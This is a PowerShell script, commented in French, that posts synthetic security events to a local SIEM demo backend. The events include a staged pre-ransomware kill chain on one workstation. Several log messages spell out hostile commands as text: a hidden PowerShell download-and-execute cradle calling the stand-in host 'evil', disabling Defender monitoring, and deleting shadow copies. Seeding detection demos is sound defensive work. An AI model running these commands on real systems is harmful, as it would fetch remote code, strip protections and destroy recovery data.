# ============================================================================
# Jeu de logs de démonstration pour MedTech SIEM
#
# Injecte des logs variés au raw_log RICHE (logon_type, parent_process,
# country, dest_port…) et aux messages contenant des techniques MITRE, afin
# que le détail de log (dépliage) ait de la matière à afficher.
#
# Usage :  ./examples/seed_demo_logs.ps1  [http://localhost:3000]
# ============================================================================

param([string]$Base = "http://localhost:3000")

function Send-Log($log) {
    $body = $log | ConvertTo-Json -Compress -Depth 6
    Invoke-RestMethod -Uri "$Base/logs" -Method POST -ContentType "application/json" -Body $body | Out-Null
}

$deadline = (Get-Date).AddSeconds(30)
do { Start-Sleep -Milliseconds 400; $up = Test-NetConnection localhost -Port ([Uri]$Base).Port -InformationLevel Quiet -WarningAction SilentlyContinue } until ($up -or (Get-Date) -gt $deadline)
if (-not $up) { throw "backend injoignable sur $Base" }

$logs = @(
    @{ source_name="DC-01"; vendor="Windows Security"; hostname="DC-01"; username="administrateur"; ip_address="203.0.113.45";
       event_type="login_failed"; severity="high";
       message="[MITRE T1110.001] Echec de connexion RDP (4625)";
       raw_log=@{ event_id=4625; logon_type=10; failure_reason="Bad password"; workstation="KALI"; country="RU"; auth_package="NTLM" } },

    @{ source_name="WS-DUPONT"; vendor="Sysmon"; hostname="WS-DUPONT"; username="j.dupont"; ip_address="10.0.0.24";
       event_type="process_create"; severity="critical";
       message="[MITRE T1059.001 + T1027] PowerShell encode: powershell -nop -w hidden -enc SQBFAFgA...";
       raw_log=@{ event_id=1; process="powershell.exe"; parent_process="winword.exe"; command_line="powershell -nop -w hidden -enc SQBFAFgA"; integrity_level="Medium"; hashes="SHA256=A1B2C3" } },

    @{ source_name="FW-EDGE"; vendor="Fortinet"; hostname="FW-EDGE"; username=$null; ip_address="45.83.12.9";
       event_type="blocked_connection"; severity="medium";
       message="[MITRE T1595.001] Connexion bloquee (scan de ports)";
       raw_log=@{ action="deny"; src_ip="45.83.12.9"; dest_ip="10.0.0.5"; dest_port=3389; protocol="TCP"; country="CN"; rule="DENY-INBOUND" } },

    @{ source_name="SRV-FILES"; vendor="EDR"; hostname="SRV-FILES"; username="svc-backup"; ip_address="10.0.0.8";
       event_type="file_renamed"; severity="critical";
       message="[MITRE T1486] Fichier chiffre: rapport.docx -> rapport.docx.lockbit";
       raw_log=@{ filename="rapport.docx"; new_extension=".lockbit"; process="encrypt.exe"; ransom_note="HOW_TO_DECRYPT.txt"; drive="D:" } },

    @{ source_name="VPN-GW"; vendor="OpenVPN"; hostname="VPN-GW"; username="m.durand"; ip_address="198.51.100.7";
       event_type="login_success"; severity="low";
       message="Connexion VPN reussie";
       raw_log=@{ event_id=4624; logon_type=3; country="FR"; city="Paris"; session_id="a1b2c3"; duration_s=0 } },

    @{ source_name="DC-01"; vendor="Windows Security"; hostname="DC-01"; username="svc-backup2"; ip_address="10.0.0.2";
       event_type="account_created"; severity="medium";
       message="[MITRE T1136.001] Compte cree: svc-backup2 (4720)";
       raw_log=@{ event_id=4720; target_account="svc-backup2"; created_by="administrateur"; account_type="local" } },

    @{ source_name="DC-01"; vendor="Windows Security"; hostname="DC-01"; username="svc-backup2"; ip_address="10.0.0.2";
       event_type="group_membership_change"; severity="high";
       message="[MITRE T1098] Ajout au groupe Administrators: svc-backup2 (4732)";
       raw_log=@{ event_id=4732; target_account="svc-backup2"; group="Administrators"; added_by="administrateur" } },

    @{ source_name="PROXY-01"; vendor="Squid"; hostname="PROXY-01"; username="c.martin"; ip_address="10.0.0.31";
       event_type="network_flow"; severity="high";
       message="[MITRE T1048] Volume sortant eleve vers destination externe";
       raw_log=@{ dest_ip="185.220.101.5"; bytes_out=734003200; bytes_in=15230; dest_port=443; country="NL"; category="cloud-storage" } },

    # ---- Kill-chain pre-ransomware sur un MEME poste (WS-PATIENT01) ----
    # 1. Phishing : Word engendre PowerShell (acces initial)
    @{ source_name="WS-PATIENT01"; vendor="Sysmon"; hostname="WS-PATIENT01"; username="s.bernard"; ip_address="10.0.0.51";
       event_type="process_create"; severity="high";
       message="[MITRE T1566.001] powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('http://evil/a')";
       raw_log=@{ event_id=1; process="powershell.exe"; parent_process="winword.exe"; command_line="powershell -nop -w hidden IEX(...)" } },

    # 2. Defense Evasion : desactivation de Defender
    @{ source_name="WS-PATIENT01"; vendor="Sysmon"; hostname="WS-PATIENT01"; username="s.bernard"; ip_address="10.0.0.51";
       event_type="process_create"; severity="high";
       message="[MITRE T1562.001] powershell Set-MpPreference -DisableRealtimeMonitoring `$true";
       raw_log=@{ event_id=1; process="powershell.exe"; parent_process="powershell.exe"; command_line="Set-MpPreference -DisableRealtimeMonitoring true" } },

    # 3. Inhibit Recovery : suppression des shadow copies
    @{ source_name="WS-PATIENT01"; vendor="Sysmon"; hostname="WS-PATIENT01"; username="s.bernard"; ip_address="10.0.0.51";
       event_type="process_create"; severity="critical";
       message="[MITRE T1490] cmd.exe /c vssadmin delete shadows /all /quiet";
       raw_log=@{ event_id=1; process="vssadmin.exe"; parent_process="cmd.exe"; command_line="vssadmin delete shadows /all /quiet" } },

    # 4. Defense Evasion : effacement du journal de securite
    @{ source_name="WS-PATIENT01"; vendor="Windows Security"; hostname="WS-PATIENT01"; username="s.bernard"; ip_address="10.0.0.51";
       event_type="audit_log_cleared"; severity="critical";
       message="[MITRE T1070.001] Journal Security efface (1102)";
       raw_log=@{ event_id=1102; channel="Security"; cleared_by="s.bernard" } }
)

$i = 0
foreach ($log in $logs) { Send-Log $log; $i++ }
"$i logs de demonstration injectes dans $Base"
